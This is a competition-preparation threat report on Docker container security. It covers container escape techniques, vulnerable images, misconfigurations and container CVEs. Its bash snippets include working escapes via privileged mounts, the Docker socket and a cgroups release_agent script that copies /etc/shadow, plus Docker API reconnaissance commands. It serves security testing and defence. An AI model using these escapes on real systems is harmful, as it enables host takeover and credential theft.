# Docker Container Threats Intelligence Report

**Classification:** CPTC Competition Preparation
**Date:** January 2026
**Analyst:** Docker Threat Intel Team

---

## Executive Summary

This report provides comprehensive threat intelligence on Docker container security vulnerabilities, escape techniques, and exploitation methodologies relevant to penetration testing competitions and security assessments.

---

## 1. Container Escape Techniques

### 1.1 Privileged Container Escape

**Severity:** Critical
**MITRE ATT&CK:** T1611 - Escape to Host

When containers run with `--privileged` flag, they have full access to host devices:

```bash
# Check if running privileged
cat /proc/1/status | grep CapEff
# CapEff: 0000003fffffffff indicates privileged

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Access host via chroot
chroot /mnt/host /bin/bash
```

**Detection Indicators:**
- Containers with SYS_ADMIN capability
- Access to /dev filesystem
- Mount syscalls from container processes

### 1.2 Docker Socket Escape

**Severity:** Critical
**CVE Reference:** Common misconfiguration

If `/var/run/docker.sock` is mounted inside a container:

```bash
# Check for socket access
ls -la /var/run/docker.sock

# Create privileged container from within container
docker run -v /:/host -it alpine chroot /host
```

**Offensive Utility:**
- Full host compromise from container access
- Lateral movement to other containers
- Persistence via container creation

### 1.3 Linux Kernel Exploits

**CVE-2022-0847 (Dirty Pipe)**
- Severity: CVSS 7.8
- Affects: Linux Kernel 5.8+
- Allows: Arbitrary file write as root
- Container Impact: Escape via overwriting host files

**CVE-2022-0185 (FSConfig Heap Overflow)**
- Severity: CVSS 8.4
- Affects: Linux Kernel 5.1+
- Requires: CAP_SYS_ADMIN in namespace
- Escape: Kernel code execution

**CVE-2021-22555 (Netfilter)**
- Severity: CVSS 7.8
- Affects: Linux Kernel 2.6.19+
- Enables: Local privilege escalation

### 1.4 Cgroups Escape

**Severity:** High
**CVE-2022-0492**

Release_agent escape technique for containers with cgroups v1:

```bash
# Requires CAP_SYS_ADMIN
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

---

## 2. Vulnerable Base Images

### 2.1 Images with Known CVEs

| Image | Common CVEs | Risk Level |
|-------|-------------|------------|
| alpine:3.14 | CVE-2021-36159 (libfetch) | Medium |
| ubuntu:18.04 | Multiple outdated packages | High |
| node:14 | npm vulnerabilities | Medium |
| python:3.8 | pip chain vulnerabilities | Medium |
| nginx:1.18 | CVE-2021-23017 (DNS resolver) | High |

### 2.2 Malicious Image Indicators

Watch for these in target environments:

- Images from untrusted registries
- Images with recent creation dates but old version tags
- Base images with cryptocurrency mining tools
- Images with reverse shell binaries
- Dockerfile with `curl | bash` patterns

### 2.3 Supply Chain Attack Vectors

**Typosquatting Images:**
```
mongoDB (malicious) vs mongodb (legitimate)
postgress vs postgres
ngnix vs nginx
```

**Compromised Build Pipelines:**
- CI/CD secrets in environment variables
- Hardcoded credentials in image layers
- Backdoored dependencies in requirements files

---

## 3. Exploitable Misconfigurations

### 3.1 Dangerous Docker Run Flags

| Flag | Risk | Exploitation |
|------|------|--------------|
| `--privileged` | Critical | Full host access |
| `--net=host` | High | Network namespace escape |
| `--pid=host` | High | Process injection |
| `--cap-add=ALL` | Critical | All capabilities |
| `-v /:/host` | Critical | Host filesystem access |
| `--security-opt=no-new-privileges:false` | Medium | Privilege escalation |

### 3.2 Sensitive Mount Points

```yaml
# Dangerous volume mounts to look for:
volumes:
  - /var/run/docker.sock:/var/run/docker.sock  # Container escape
  - /etc:/host/etc                              # Config access
  - /root/.ssh:/root/.ssh                       # SSH keys
  - /var/log:/var/log                           # Log injection
  - /proc:/host/proc                            # Process info leak
```

### 3.3 Network Misconfigurations

- Containers with `--network=host`
- Exposed management ports (2375/2376)
- Inter-container communication enabled by default
- Missing network segmentation

---

## 4. Container-Specific CVEs

### 4.1 Docker Engine CVEs

**CVE-2024-41110 - AuthZ Plugin Bypass**
- Severity: Critical (CVSS 10.0)
- Affected: Docker Engine < 27.1.0
- Impact: Authorization bypass via Content-Length 0
- Exploitation: Send API requests with empty body

**CVE-2024-29018 - DNS Rebinding**
- Severity: High
- Affected: Docker Engine with custom DNS
- Impact: Network access bypass

**CVE-2024-23651 - BuildKit Cache Race**
- Severity: High (CVSS 8.7)
- Affected: BuildKit < 0.12.5
- Impact: Host file access during build

### 4.2 containerd CVEs

**CVE-2023-25153 - OCI Image Import**
- Severity: Medium
- Impact: Resource exhaustion via crafted images

**CVE-2022-23648 - Volume Mount**
- Severity: High
- Impact: Host file system access

### 4.3 runc CVEs

**CVE-2024-21626 - Working Directory Escape**
- Severity: Critical (CVSS 8.6)
- Affected: runc < 1.1.12
- Impact: Container escape via /proc/self/fd
- PoC Available: Yes

**CVE-2019-5736 - Overwrite runc Binary**
- Severity: Critical
- Impact: Host code execution
- Status: Patched but legacy systems vulnerable

---

## 5. Reconnaissance Techniques

### 5.1 Container Detection

```bash
# Detect if inside container
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv
cat /proc/1/sched | head -1

# Enumerate container runtime
cat /proc/self/mountinfo | grep -E 'docker|containerd|overlay'
```

### 5.2 Container Enumeration

```bash
# Check capabilities
capsh --print

# Check seccomp profile
cat /proc/self/status | grep Seccomp

# List available devices
ls -la /dev/

# Check for sensitive mounts
mount | grep -E 'docker|host|proc'
```

### 5.3 Docker API Reconnaissance

```bash
# Check for exposed Docker API
curl -s http://target:2375/version
curl -s http://target:2375/containers/json

# Enumerate via API
curl -s http://target:2375/images/json
curl -s http://target:2375/info
```

---

## 6. Tool Development Recommendations

### 6.1 Scanner Development

Build automated checks for:
- Privileged containers
- Dangerous capabilities
- Exposed Docker sockets
- Vulnerable base image versions
- Sensitive file mounts

### 6.2 Exploit Integration

Prioritize exploits for:
1. runc CVE-2024-21626 (container escape)
2. Docker AuthZ bypass CVE-2024-41110
3. Dirty Pipe CVE-2022-0847
4. BuildKit race conditions

### 6.3 Post-Exploitation

Develop modules for:
- Container pivot to host
- Multi-container lateral movement
- Credential harvesting from environment variables
- Container persistence mechanisms

---

## 7. References

- Docker Security Documentation
- CIS Docker Benchmark
- NIST Container Security Guide (SP 800-190)
- Aqua Security Research Blog
- Sysdig Threat Research
- NVD Database for Container CVEs

---

**Document Version:** 1.0
**Next Review:** Quarterly or upon major CVE disclosure
